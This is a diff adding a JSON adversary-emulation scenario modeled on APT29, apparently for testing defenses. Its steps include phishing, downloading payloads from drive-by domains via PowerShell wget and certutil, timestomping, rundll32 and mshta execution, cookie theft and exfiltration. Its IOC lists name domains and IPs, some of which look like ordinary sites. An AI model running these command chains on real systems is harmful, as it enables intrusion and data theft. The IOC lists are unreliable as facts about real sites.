@@ -1,0 +1,903 @@
+{
+    "meta_data": {
+        "name": "apt29_variant3",
+        "version": "v1.0.0",
+        "title": "APT-29 Inspired Scenario Variant 3",
+        "description": "Inspired by APT29. An automated attack meant to emulate an APT actor with the common names Solorigate, SUNBURST, NobleBaron, Dark Halo, StellarParticle, NOBELIUM, UNC2452, YTTRIUM, The Dukes, Cozy Bear, CozyDuke, and APT29. The attack uses a variety of means to obtain data and downloads multiple files to disk.",
+        "author": "Attack Content",
+        "suggested_duration": 912
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "self.tool_name2",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX3",
+            "preconditions": {
+                "payload": "self.tool_name3",
+                "driveby": "self.driveby3",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces4",
+            "preconditions": {
+                "driveby": "self.driveby4"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS4",
+            "preconditions": {
+                "driveby": "self.driveby4"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX4",
+            "preconditions": {
+                "payload": "self.tool_name4",
+                "driveby": "self.driveby4",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces5",
+            "preconditions": {
+                "driveby": "self.driveby5"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS5",
+            "preconditions": {
+                "driveby": "self.driveby5"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX5",
+            "preconditions": {
+                "payload": "self.tool_name5",
+                "driveby": "self.driveby5",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "SpearPhishingLink",
+            "technique": "InitialAccess",
+            "label": "spearPhishingLink",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "body": {
+                        "template": [
+                            "Check out our discount code!\nhttp://",
+                            "self.driveby_domain2",
+                            "/",
+                            "self.tool_name2",
+                            "\nBing Shopping"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WindowsManagementInstrumentation",
+            "technique": "Execution",
+            "label": "wmi",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c wmic qfe list && wmic useraccount list && wmic group list && echo \" \""
+                }
+            }
+        },
+        {
+            "tactic": "VisualBasic",
+            "technique": "Execution",
+            "label": "visualBasic",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "ingressToolTransfer1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\\",
+                            "self.tool_name3",
+                            "\"; wget -O $fp http://",
+                            "self.driveby_domain3",
+                            "/",
+                            "self.tool_name3",
+                            "; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WindowsRemoteManagement",
+            "technique": "LateralMovement",
+            "label": "winRM",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_name": "self.tool_name3",
+                    "output_directory": "self.temp_dir_name",
+                    "output_file_name": "self.tool_name3"
+                }
+            }
+        },
+        {
+            "tactic": "TimeStomp",
+            "technique": "DefenseEvasion",
+            "label": "timeStomp",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name3",
+                            "; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "Steganography",
+            "technique": "c2",
+            "label": "steganography",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "steg_filepath": {
+                        "template": [
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name3"
+                        ]
+                    },
+                    "success_override": true,
+                    "kill": false
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletionPowershell",
+            "technique": "DefenseEvasion",
+            "label": "fileDeletion",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c del ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name3",
+                            " && echo ' '"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ValidAccounts_DomainAccounts",
+            "technique": "PrivilegeEscalation",
+            "label": "validAccounts_DomainAccounts",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_2",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "MasqueradeTaskOrService",
+            "technique": "DefenseEvasion",
+            "label": "masqueradeTask",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "ingressToolTransfer2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c certutil.exe -urlcache -split -f http://",
+                            "self.driveby_domain5",
+                            "/",
+                            "self.tool_name5",
+                            " ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name5",
+                            " && echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "Rundll32",
+            "technique": "DefenseEvasion",
+            "label": "rundll32",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c rundll32 desk.cpl,InstallScreenSaver ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name5",
+                            " && echo \" \""
+                        ]
+                    },
+                    "success_override": true,
+                    "kill": false
+                }
+            }
+        },
+        {
+            "tactic": "StealWebSessionCookie",
+            "technique": "CredentialAccess",
+            "label": "cookiesCreds",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "exfil": "self.exfil",
+                "tune": {
+                    "exfil_file": "C:\\Users\\Public\\WsmPty.zip"
+                }
+            }
+        },
+        {
+            "tactic": "Mshta",
+            "technique": "DefenseEvasion",
+            "label": "mshta",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "url": "self.driveby_domain4",
+                    "file_name": "self.tool_name4"
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "efax.pfdweek.com.com",
+            "efax.pfdregistry.net",
+            "efax.pfdresearch.org",
+            "theyardservice.com",
+            "worldhomeoutlet.com",
+            "theandersonco.com",
+            "tomasubiera.com",
+            "nordicmademedia.com",
+            "stonecrestnews.com",
+            "pickconferences.com",
+            "telecap.org",
+            "stillheroes.com",
+            "vestdesigns.net",
+            "lintship.com",
+            "jetorchid.com",
+            "VulkanGame.website",
+            "francel.fr",
+            "autohaus.co.uk",
+            "nicoshop.it",
+            "balenciagassneakers.com",
+            "Simply-Red.org",
+            "whatsignals.com",
+            "singoffice.net",
+            "riseandspin.com",
+            "nullmindz.com",
+            "leavelime.com",
+            "urchealthsystems.org",
+            "gogetfit.com",
+            "forexoffline.com",
+            "easymobilelife.com",
+            "ourclubpages.net",
+            "crowsworks.com",
+            "frcyberinfo.fr",
+            "namecomposer.club",
+            "nanasews.net",
+            "pothuts.com",
+            "hostcovers.com",
+            "GoWakeRun.club",
+            "miraTimes.net",
+            "CanData.org",
+            "YouthTravels.org",
+            "FalconStudioTours.com",
+            "cluebird.com",
+            "dropcircuit.com",
+            "goldtraces.com",
+            "calcdatanet.com",
+            "cyberservice.com"
+        ],
+        "ip": [
+            "103.73.188.101/24",
+            "141.98.212.55/24",
+            "192.48.88.107/24",
+            "209.58.186.196/24",
+            "85.93.2.116/24",
+            "119.81.184.11/24",
+            "185.124.86.121/24",
+            "173.243.80.6/24",
+            "177.10.96.30/24",
+            "185.132.124.43/24",
+            "39.49.145.132/24",
+            "128.98.2.184/24",
+            "208.58.121.225/24",
+            "56.55.27.184/24",
+            "102.92.129.254/24",
+            "106.180.179.180/24",
+            "183.223.39.151/24",
+            "75.195.49.227/24",
+            "163.86.60.172/24",
+            "214.101.34.49/24",
+            "162.115.21.206/24",
+            "93.246.99.251/24",
+            "138.113.83.22/24",
+            "221.63.210.32/24",
+            "17.197.19.252/24",
+            "143.218.10.9/24",
+            "148.171.70.218/24",
+            "248.8.130.45/24",
+            "210.71.138.100/24",
+            "212.189.120.60/24",
+            "33.253.65.118/24",
+            "150.203.226.173/24",
+            "113.86.118.179/24",
+            "26.68.242.196/24",
+            "218.36.89.177/24",
+            "110.86.147.151/24",
+            "27.26.186.106/24",
+            "243.89.43.55/24",
+            "176.27.235.58/24",
+            "148.170.105.138/24",
+            "227.60.221.238/24",
+            "64.74.111.190/24",
+            "43.168.210.36/24",
+            "186.14.231.129/24",
+            "171.204.82.208/24",
+            "204.41.34.208/24",
+            "112.102.124.99/24",
+            "162.69.151.35/24",
+            "115.210.183.102/24",
+            "109.166.30.255/24"
+        ],
+        "binary": [
+            "WellMess.exe",
+            "powercfg.exe",
+            "megatools.exe",
+            "handle64.exe",
+            "mtt.exe",
+            "mt.exe",
+            "movefile.exe",
+            "diagview.exe",
+            "googleService.exe",
+            "at32.exe",
+            "timecfg.exe",
+            "curlx64.exe",
+            "dccwe.exe",
+            "fragrec.exe",
+            "dsktpimgdownldr.exe",
+            "ctunesvr.exe",
+            "credviz.exe",
+            "DevEject.exe",
+            "DevEnroll.exe",
+            "dskperf.exe",
+            "cd32.exe",
+            "cd64.exe",
+            "dskpart.exe",
+            "dskraid.exe",
+            "dmjoin.exe",
+            "dspdiag.exe",
+            "dvdp1ay.exe",
+            "htic.exe",
+            "DXCaps.exe",
+            "dxdiagx64.exe",
+            "i386gcc.exe",
+            "effsui.exe",
+            "gpoutil.exe",
+            "e3paHost.exe",
+            "SimpleGUIcreator.exe",
+            "commbridge32.exe",
+            "commbridge64.exe",
+            "ktxutil.exe",
+            "lable.exe",
+            "wslWin.exe",
+            "LoginUI.exe",
+            "makeapp.exe",
+            "Magnifyi386.exe",
+            "Lsals0.exe",
+            "MCU2.exe",
+            "managebde.exe",
+            "lpkdelete.exe",
+            "MBEServer.exe",
+            "MbRes.exe",
+            "mnc.exe",
+            "m0bsync.exe",
+            "mountvolume.exe"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "phishing": {
+            "1": {
+                "ioc-server_addr": "200.200.200.201",
+                "from_addr": "Bob.Burke@site.com",
+                "to_addrs": "Madelyn.Luna@site.com",
+                "cc": "",
+                "bcc": "",
+                "subject": "Bing Shopping Discounts!",
+                "body_subtype": "plain",
+                "attach": "",
+                "username": "bob.burke",
+                "password": "",
+                "port": "25"
+            }
+        },
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "90",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "help_win_x86.exe"
+            },
+            "3": {
+                "name": "motorcycle.png"
+            },
+            "4": {
+                "name": "morph.hta"
+            },
+            "5": {
+                "name": "Mystifying.scr"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "123.35.79.48/24",
+                "ioc-domain_driveby": "foodtourusa.org"
+            },
+            "3": {
+                "ioc-ip_driveby": "43.15.182.201/24",
+                "ioc-domain_driveby": "cdc.healthadvice.com"
+            },
+            "4": {
+                "ioc-ip_driveby": "23.151.18.108/24",
+                "ioc-domain_driveby": "nownews.com"
+            },
+            "5": {
+                "ioc-ip_driveby": "187.89.56.49/24",
+                "ioc-domain_driveby": "oregonhealthsystems.com"
+            }
+        },
+        "targets": {
+            "1": {
+                "payload_destination": "C:\\Users\\Public",
+                "ioc-temp_dir": "C:\\Windows\\debug\\WIA"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "tool_name3": {
+                "path": [
+                    "tool",
+                    "3",
+                    "name"
+                ]
+            },
+            "tool_name4": {
+                "path": [
+                    "tool",
+                    "4",
+                    "name"
+                ]
+            },
+            "tool_name5": {
+                "path": [
+                    "tool",
+                    "5",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby3": {
+                "path": [
+                    "driveby",
+                    "3"
+                ]
+            },
+            "driveby4": {
+                "path": [
+                    "driveby",
+                    "4"
+                ]
+            },
+            "driveby5": {
+                "path": [
+                    "driveby",
+                    "5"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain3": {
+                "path": [
+                    "driveby",
+                    "3",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain4": {
+                "path": [
+                    "driveby",
+                    "4",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain5": {
+                "path": [
+                    "driveby",
+                    "5",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "temp_dir_name": {
+                "path": [
+                    "targets",
+                    "1",
+                    "ioc-temp_dir"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1_elevated": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt1_elevated": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
